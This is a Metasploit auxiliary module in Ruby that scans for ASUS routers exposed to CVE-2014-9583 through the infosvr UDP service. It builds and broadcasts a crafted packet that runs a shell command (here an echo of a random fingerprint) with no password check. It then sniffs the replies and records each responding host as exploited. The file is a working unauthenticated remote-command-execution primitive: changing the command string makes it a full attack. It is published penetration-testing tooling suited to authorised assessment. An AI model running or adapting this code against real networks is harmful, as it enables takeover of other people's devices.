##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::UDPScanner

  def initialize
    super(
      'Name'           => 'ASUS infosvr Scanner',
      'Description'    => 'Discover ASUS infosvr servers vulnerable to CVE-2014-9583.',
      'Author'         => [
        'Friedrich Postelstorfer', # Initial public disclosure and Python exploit
        'jduck', # Independent discovery and C exploit
        'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
      ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Jan 4 2015',
      'References'     => [
          ['CVE', '2014-9583'],
          ['EDB', '35688'],
          ['URL', 'https://github.com/jduck/asus-cmd']
      ])
    register_options [
      Opt::RPORT(9999),
      OptAddressRange.new('RHOSTS', [true, 'The broadcast address or CIDR range of targets to query', '255.255.255.255'])
    ]
  end

  def rport
    datastore['RPORT']
  end

  def request
    pkt = ''
    # ServiceID   [byte]      ; NET_SERVICE_ID_IBOX_INFO
    pkt << "\x0C"
    # PacketType  [byte]      ; NET_PACKET_TYPE_CMD
    pkt << "\x15"
    # OpCode      [word]      ; NET_CMD_ID_MANU_CMD
    pkt << "\x33\x00"
    # Info        [dword]     ; Comment: "Or Transaction ID"
    pkt << Rex::Text.rand_text_alphanumeric(4)
    # MacAddress  [byte[6]]   ; Double-wrongly "checked" with memcpy instead of memcmp
    pkt << Rex::Text.rand_text_alphanumeric(6)
    # Password    [byte[32]]  ; Not checked at all
    pkt << "\x00" * 32
    # Command Length + \x00 + Command padded to 512 bytes
    pkt << ([@cmd.length].pack('C') + "\x00" + @cmd).ljust((512 - pkt.length), "\x00")
  end

  def scan_host(ip)
    vprint_status "Sending request to #{ip}:#{rport}"
    scanner_send request, ip, rport
  end

  def scanner_prescan(batch)
    @fingerprint = Rex::Text.rand_text_alphanumeric(rand(10) + 10)
    @cmd = "echo #{@fingerprint}"

    print_status "Sending requests to #{batch.length} hosts..."

    @results = []

    open_pcap 'SNAPLEN' => 128,
              'FILTER' => "udp and src port #{rport} and dst port #{rport}"

    @t = Thread.new do
      begin
        each_packet do |pkt|
          res = parse_packet pkt
          @results << res unless res.nil?
        end
      rescue ::Interrupt
        raise $!
      ensure
        close_pcap
      end
    end
  end

  def scanner_postscan(_batch)
    @t.kill

    if @results.empty?
      print_status 'No infosvr services found.'
      return
    end

    found = {}
    @results.uniq.each do |pkt|
      ip = IPAddr.new(pkt.ip_src, Socket::AF_INET).to_s
      next if found[ip]

      print_good "#{ip}:#{rport} is VULNERABLE"

      report_service host: ip, port: rport, proto: 'udp', name: 'infosvr'
      report_vuln host: ip,
                  port: rport,
                  proto: 'udp',
                  name: 'infosvr',
                  info: "Module #{self.fullname} confirmed remote command execution via this ASUS infosvr service",
                  refs: self.references,
                  exploited_at: Time.now.utc
      found[ip] = true
    end
  end

  def parse_packet(pkt)
    p = PacketFu::Packet.parse pkt
    return unless p.is_eth?
    return unless p.is_ip?
    return unless p.is_udp?
    return unless p.udp_src == 9999
    return unless p.udp_dst == 9999
    return unless IPAddr.new(p.ip_dst, Socket::AF_INET).to_s == '255.255.255.255'
    return unless p.payload.to_s.match?(/#{@fingerprint}/)
    p
  rescue
    nil
  end
end
